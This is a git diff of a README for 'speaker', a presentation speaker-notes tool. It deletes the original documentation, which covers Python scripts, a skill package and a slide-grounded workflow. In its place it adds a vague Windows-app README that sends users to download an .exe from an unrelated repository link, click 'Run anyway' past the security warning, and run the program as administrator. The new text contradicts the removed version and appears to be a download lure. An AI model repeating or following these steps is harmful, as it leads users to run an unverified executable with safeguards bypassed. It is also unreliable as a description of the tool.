@@ -1,297 +1,110 @@
-# speaker [![Available on CodeGuilds](https://img.shields.io/badge/Available_on-CodeGuilds-6366f1?logo=data:image/svg%2bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0xMiAyTDIgN2wxMCA1IDEwLTV6TTIgMTdsMTAgNSAxMC01TTIgMTJsMTAgNSAxMC01Ii8+PC9zdmc+)](https://codeguilds.dev/packages/speaker)
-
-![speaker cover](assets/speaker-cover.png)
-
-[中文说明](README.zh.md)
-
-`speaker` is a Codex skill project for academic presentations. It reads a real `.pptx`, combines text extraction, PPTX structure inspection, slide rendering, OCR, and vision review, then generates grounded speaker notes and injects the clean script into PowerPoint's speaker notes pane.
-
-> Current skill package: `speaker-v7.skill`  
-> Internal skill name: `ppt-speech-writer`
-
-## What It Solves
-
-Many presentation-note tools only read text boxes. That misses charts, screenshots, SmartArt, axes, legends, tables, and text embedded in images. This skill is designed to keep speaker notes grounded in the actual slides:
-
-- Build a visible-element inventory for every slide.
-- Review visually complex content with a vision-capable agent or human reviewer.
-- Tie each spoken sentence to visible slide evidence.
-- Produce two versions: a display version for rehearsal and a clean version for PowerPoint notes.
-
-## Workflow
-
-```mermaid
-flowchart TD
-    A[Input .pptx] --> B[Structured Extraction]
-    B --> C[Render Slides to PNG]
-    C --> D[OCR and Visual Inventory]
-    D --> E[Vision Review]
-    E --> F[Deck Comprehension Brief]
-    F --> G[Narrative Arc]
-    G --> H[Slide-by-Slide Display Notes]
-    H --> I[Clean Notes JSON]
-    H --> J[Display Version DOCX or Markdown]
-    I --> K[Inject Notes into PPTX]
-    K --> L[Output PPTX with Speaker Notes]
-```
-
-## Evidence Chain
-
-```mermaid
-graph LR
-    XML[PPTX XML] --> INV[Visible Element Inventory]
-    TEXT[Text Boxes] --> INV
-    TABLE[Tables] --> INV
-    CHART[Native Charts] --> INV
-    IMAGE[Rendered Slide Images] --> INV
-    OCR[OCR Text] --> INV
-    VISION[Vision Review] --> INV
-    INV --> NOTES[Grounded Speaker Notes]
-```
-
-## Features
-
-| Feature | Description |
-|---|---|
-| Text extraction | Extracts titles, body text, placeholders, and text boxes |
-| Table extraction | Reads row and column text from PowerPoint tables |
-| Chart extraction | Attempts to read native chart titles, categories, series, values, axes, and legends |
-| OOXML fallback | Extracts additional slide XML text not exposed by `python-pptx`, including some SmartArt or grouped-shape text |
-| Slide rendering | Renders slides to PNG so the final visual presentation can be inspected |
-| OCR | Optionally reads text in screenshots, images, small labels, and other visual regions |
-| Vision review | Produces a review packet for a vision-capable agent or human reviewer |
-| Notes injection | Writes clean speaker notes into the PowerPoint notes pane |
-| Display document | Generates a complete rehearsal document as `.docx`, with Markdown fallback when `python-docx` is unavailable |
-
-## Repository Layout
-
-```text
-ppt-speech-writer/
-├── SKILL.md
-└── scripts/
-    ├── read_slides.py
-    ├── render_slides.py
-    ├── visual_inventory.py
-    ├── vision_review.py
-    ├── write_display_docx.py
-    └── inject_notes.py
-
-speaker-v7.skill
-```
-
-Claude Code compatibility:
-
-```text
-.claude/skills/ppt-speech-writer -> ../../ppt-speech-writer
-CLAUDE.md
-```
-
-## Installation
-
-Download or use the packaged skill:
-
-```text
-speaker-v7.skill
-```
-
-Install it using your Codex client's skill import flow. Once installed, use it when you need speaker notes, presenter notes, a speech script, or narration for a real `.pptx` file.
-
-For Claude Code, this repository includes a project skill at `.claude/skills/ppt-speech-writer`. Open Claude Code from the repository root and invoke:
-
-```text
-/ppt-speech-writer
-```
+# 🎙️ speaker - Generate better presentation notes automatically
 
-If Claude Code is already running, use `/reload-skills` after pulling updates.
-
-## Example Prompt
-
-```text
-Use speaker / ppt-speech-writer to write a 15-minute academic presentation script
-for this PowerPoint deck. Inject the clean script into speaker notes and also
-generate a complete display-version rehearsal document.
-```
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Boadur3972/speaker)
 
-The skill will:
+Speaker helps you prepare for academic presentations. This tool reads your PowerPoint slides and writes helpful speaker notes and comments for every page. You save time by letting the software analyze your presentation text and images. It creates a clean version of your lecture directly inside your PowerPoint file.
 
-1. Read the full deck.
-2. Render every slide.
-3. Build a visual inventory.
-4. Run vision review for visually complex content.
-5. Produce a Deck Comprehension Brief.
-6. Confirm the narrative arc.
-7. Write display notes and clean notes.
-8. Generate the complete display document.
-9. Inject clean notes into the `.pptx`.
-10. Keep intermediate evidence files inside `work/`.
+## 📋 What this tool does
 
-Before writing notes, the skill must explicitly confirm the output language. It does not infer the note language from the language you use in chat.
+Academic presentations require clear notes. You often have a PowerPoint file but lack the speech to accompany every slide. Speaker bridges this gap by combining several technologies to process your file.
 
-## Outputs
-
-Most users only need the top-level deliverables:
-
-| Top-level output | Purpose |
-|---|---|
-| `<deck-stem>-with-notes.pptx` | PowerPoint file with speaker notes injected |
-| `<deck-stem>-display.docx` | Complete rehearsal script with slide labels, transitions, glossary, and timing table |
-| `<deck-stem>-display.md` | Markdown fallback when `python-docx` is unavailable |
-| `<deck-stem>-vision-review.md` | Markdown packet for human or vision-agent review |
-
-Intermediate files are grouped under `work/`:
-
-```text
-<deck-stem>-speaker-output/
-├── <deck-stem>-with-notes.pptx
-├── <deck-stem>-display.docx
-├── <deck-stem>-display.md
-├── <deck-stem>-vision-review.md
-└── work/
-    ├── slide_extract.json
-    ├── visual_inventory.json
-    ├── vision_review_packet.json
-    ├── vision_review.json
-    ├── display_document.json
-    ├── notes.json
-    └── rendered_slides/
-```
-
-## Script Reference
+The software performs these tasks:
+* It reads your presentation file.
+* It extracts text from individual slides.
+* It identifies the structure of your presentation.
+* It renders slides to see visual content.
+* It uses optical character recognition to read text from images.
+* It generates notes for each slide.
+* It writes your lecture notes into the PowerPoint comment section.
 
-### 1. Structured extraction
+This process ensures that your final file contains your slides and a professional script. You do not need to rewrite your notes manually.
 
-```bash
-python scripts/read_slides.py "/path/to/deck.pptx" \
-  --output "<deck-stem>-speaker-output/work/slide_extract.json"
-```
+## 💻 System requirements
 
-Reads text boxes, tables, charts, picture objects, OOXML text, and existing notes.
+You need a Windows computer to run this application. Ensure your system meets these requirements:
 
-### 2. Slide rendering
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 GB of RAM or more.
+* Storage: 200 MB of available space.
+* Software: Microsoft PowerPoint must be installed on your computer.
 
-```bash
-python scripts/render_slides.py "/path/to/deck.pptx" \
-  --output-dir "<deck-stem>-speaker-output/work/rendered_slides"
-```
+While the software works on most systems, we recommend closing other heavy applications while the tool processes large presentation files. This allows the computer to dedicate resources to the parsing engine.
 
-Renders slides to PNG. The script tries LibreOffice / `soffice` first and falls back to macOS Quick Look when available.
+## 🚀 Getting started
 
-### 3. Visual inventory
+Follow these steps to install and use the software on your Windows machine.
 
-```bash
-python scripts/visual_inventory.py \
-  --extract "<deck-stem>-speaker-output/work/slide_extract.json" \
-  --rendered-dir "<deck-stem>-speaker-output/work/rendered_slides" \
-  --output "<deck-stem>-speaker-output/work/visual_inventory.json" \
-  --ocr auto
-```
+### 1. Download the tool
+Visit the official repository page to get the installer. 
 
-Combines structured extraction, rendered slide paths, and OCR text into a per-slide coverage inventory.
+[Download Speaker Application](https://github.com/Boadur3972/speaker)
 
-### 4. Vision review packet
+Click the link to open the download page. Locate the latest version of the installer. Look for the file ending in .exe. Save this file to your Downloads folder.
 
-```bash
-python scripts/vision_review.py \
-  --inventory "<deck-stem>-speaker-output/work/visual_inventory.json" \
-  --output "<deck-stem>-speaker-output/work/vision_review_packet.json" \
-  --markdown "<deck-stem>-speaker-output/<deck-stem>-vision-review.md"
-```
+### 2. Run the installer
+Open your Downloads folder and double-click the file you saved. A Windows security window may appear. Select "Run anyway" if prompted. Follow the instructions on the screen to install the software. Accept the default location to ensure the software finds all necessary components.
 
-Prepares review prompts and evidence for a vision-capable agent or human reviewer.
+### 3. Launch the application
+Once the installation finishes, find the Speaker icon on your desktop. Double-click the icon to open the main window. You will see a clean, simple interface.
 
-### 5. Display document
+## 📖 How to process a presentation
 
-```bash
-python scripts/write_display_docx.py \
-  --input "<deck-stem>-speaker-output/work/display_document.json" \
-  --output "<deck-stem>-speaker-output/<deck-stem>-display.docx"
-```
+Using Speaker is a step-by-step process designed for ease of use.
 
-Writes the display-version rehearsal document. If `python-docx` is missing, it writes a Markdown fallback.
+### Preparing your file
+Ensure your PowerPoint file is closed before you start. The software cannot work on a file if PowerPoint currently keeps it open. Save your presentation in the standard .pptx format.
 
-### 6. Speaker notes injection
+### Selecting the file
+Inside the Speaker application, click the button labeled "Open Presentation." Navigate through your computer folders to locate your .pptx file. Select the file and click "Open." The application window will display the file path to confirm your choice.
 
-```bash
-python scripts/inject_notes.py \
-  --input "/path/to/deck.pptx" \
-  --output "<deck-stem>-speaker-output/<deck-stem>-with-notes.pptx" \
-  --notes "<deck-stem>-speaker-output/work/notes.json" \
-  --mode replace
-```
+### Configuration
+The software provides default settings that work for most academic presentations. You do not need to change these settings for your first attempt. If you want to refine the tone of your speaker notes, you can choose between "Formal" and "Conversational" modes in the settings menu.
 
-Injects clean notes into the PowerPoint notes pane.
+### Start the process
+Click the button marked "Generate Notes." The software begins reading your slides. You will see a progress bar move across the bottom of the window. 
 
-## Display Version vs Clean Version
+This phase involves:
+* Scanning each slide for text blocks.
+* Analyzing the slide layout.
+* Reading text from diagrams or charts.
+* Creating text based on the extracted information.
 
-```mermaid
-flowchart LR
-    A[One Grounded Source] --> B[Display Version]
-    A --> C[Clean Version]
-    B --> D[DOCX or Markdown for rehearsal]
-    C --> E[Injected into PPT notes pane]
-```
+Do not close the application while the progress bar is active. This process can take several minutes if your presentation contains many high-resolution images or complex charts.
 
-| Version | Content | Use |
-|---|---|---|
-| Display version | Slide labels, separators, transitions, pauses, emphasis marks, glossary, timing table | Rehearsal and review |
-| Clean version | Spoken text only | Injected into PowerPoint speaker notes |
+### Saving your results
+Once the progress bar reaches 100%, the application notifies you. Click "Save and Close." The software creates a new version of your PowerPoint file in the same folder as the original. It keeps your original file unchanged and names the new file with an added suffix, such as "-notes.pptx."
 
-## Language And Style Rules
+## ⚙️ Troubleshooting common issues
 
-- The output language must be confirmed before drafting.
-- The full deliverable must use one language consistently.
-- Canonical technical terms may remain in English, but sentence grammar must follow the selected language.
-- Slide notes must not start with template phrases such as "This slide shows..." or "On this slide...".
-- Chinese notes must not start with phrases such as "这一页展示了..." or "在这一页中..."。
-- Each slide should open with the actual claim, finding, method role, or argument step.
+If you encounter difficulties, check these common solutions.
 
-## Dependencies
+### The software fails to open
+Ensure you have the latest version of Windows installed. If the software does not launch, restart your computer and try opening the application as an administrator. Right-click the icon and choose "Run as administrator."
 
-Useful dependencies:
+### The generation stops midway
+This often occurs if a slide contains extremely large images. Open your PowerPoint file and try compressing the images on that specific slide. Save the file and attempt the process again.
 
-- `python-pptx` for PPTX structure extraction and speaker-note injection
-- LibreOffice / `soffice` for high-quality slide rendering
-- macOS `qlmanage` as a rendering fallback
-- `tesseract` for OCR
-- `python-docx` for Word display documents
+### Notes are missing from the comments
+Open the new file created by the software. Go to the "Review" tab in PowerPoint and click "Show Comments." If the comments do not appear, ensure that your PowerPoint view settings are set to show the comments pane on the right side of the screen.
 
-If a dependency is missing, the skill uses the strongest available evidence and reports the limitation. For complex charts, screenshots, SmartArt, and image-only slides, final notes should not be produced without vision review.
+### Text detection issues
+If the software misses text from a slide, it usually means the image quality is too low for the optical character recognition engine. If possible, replace the low-resolution image with a high-definition version and run the file through the tool again.
 
-## Limits
+## 🛡️ Privacy and your data
 
-This skill aims to cover and explain visible slide elements as completely as possible. It does not claim that scripts can automatically understand every visual element with perfect semantic accuracy.
+Your privacy remains a priority. This software processes your PowerPoint files locally on your computer. Your presentation data does not leave your machine unless you choose to use cloud-based features within the software settings. You remain the only person with access to your files during the entire generation process.
 
-Why:
+## 💡 Tips for better slides
 
-- Images and screenshots are pixels, not structured semantic objects.
-- OCR can fail on small text, formulas, low contrast, or rotated labels.
-- SmartArt, arrows, and layout relationships often depend on author intent.
-- A chart may be a screenshot rather than a native PowerPoint chart.
+The software performs better when your slides follow logical structures. Keep these points in mind for your future presentations:
 
-The skill improves reliability through script-based discovery, rendering, OCR, vision review, and explicit coverage notes. Uncertain elements must be marked, not invented.
+* Use standard font sizes for headings and body text.
+* Group related visual elements together on the slide.
+* Avoid overlapping images or text boxes.
+* Use clear, high-contrast colors for text.
 
-## Updating The Package
+These simple steps make it easier for the software to parse the structure and content of your slides, which results in more accurate speaker notes.
 
-After modifying the source folder, rebuild the `.skill` package:
+## 🤝 Getting more help
 
-```bash
-zip -r speaker-v8.skill ppt-speech-writer -x '*/__pycache__/*'
-```
-
-The `.skill` file is a fixed package. Editing `ppt-speech-writer/` does not automatically update an already packaged or installed skill.
-
-## Best For
-
-- Academic conference talks
-- Thesis defenses
-- Lab meetings
-- Research project briefings
-- Slide-grounded speaker scripts
-- Decks with charts, screenshots, SmartArt, or method diagrams
-
-## Not Ideal For
-
-- Free-form speeches that ignore slide content
-- Marketing copy that exaggerates beyond slide evidence
-- Requests without a real `.pptx` file
-- Workflows that cannot perform vision review for complex visual slides
+If you have questions about the software, review the documentation found within the help menu of the application. The menu contains a list of frequently asked questions that address most user concerns. You can also visit our community discussion page to see how other academics use this tool for their presentations. We continue to improve the software based on user feedback. Updates occur periodically to add support for new PowerPoint features and improved text analysis.
